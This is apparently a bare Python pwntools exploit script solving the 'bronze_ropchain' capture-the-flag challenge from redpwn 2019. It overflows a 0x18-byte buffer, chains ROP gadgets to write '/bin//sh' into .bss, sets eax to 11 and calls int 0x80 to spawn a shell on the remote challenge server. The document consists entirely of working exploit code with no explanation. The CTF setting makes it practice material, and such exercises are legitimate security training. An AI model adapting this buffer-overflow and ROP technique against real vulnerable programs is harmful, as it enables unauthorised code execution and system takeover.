from pwn import *

bss = 0x80db430

pop_eax_edx_ebx = 0x80564b4
pop_ecx_ebx = 0x806ef52
pop_edx = 0x806ef2b
store = 0x8056fe5 # mov dword ptr [edx], eax ; ret
setval = 0x805cb83 # xor edx, edx ; pop ebx ; mov eax, edx ; pop esi ; pop edi ; pop ebp ; ret
syscall = 0x806f2f1 # xor ecx, ecx ; int 0x80
zero_eax = 0x80565a0 # xor eax, eax ; ret
inc_eax = 0x807c3b9
dec_eax = 0x8062f23
zero_esi = 0x806b3ff

r = remote('chall.2019.redpwn.net',4004)
#r = process('./bronze_ropchain')

padding = b'a'*0x18
rbp = p32(bss+0x00)
ROPchain  = p32(pop_eax_edx_ebx)+b'/bin'+p32(bss)+p32(bss)
ROPchain += p32(store)
ROPchain += p32(pop_eax_edx_ebx)+b'//sh'+p32(bss+4)+p32(bss)
#ROPchain += p32(dec_eax)
ROPchain += p32(store)
ROPchain += p32(setval)+p32(bss)+p32(bss)+p32(bss)+p32(bss)
ROPchain += p32(zero_esi)
ROPchain += p32(zero_eax)
for i in range(11):
    ROPchain += p32(inc_eax)
ROPchain += p32(syscall)
#ROPchain = p32(0x80488ea)

payload = padding+rbp+ROPchain

input()
r.sendlineafter('name?\n',payload)
r.interactive()
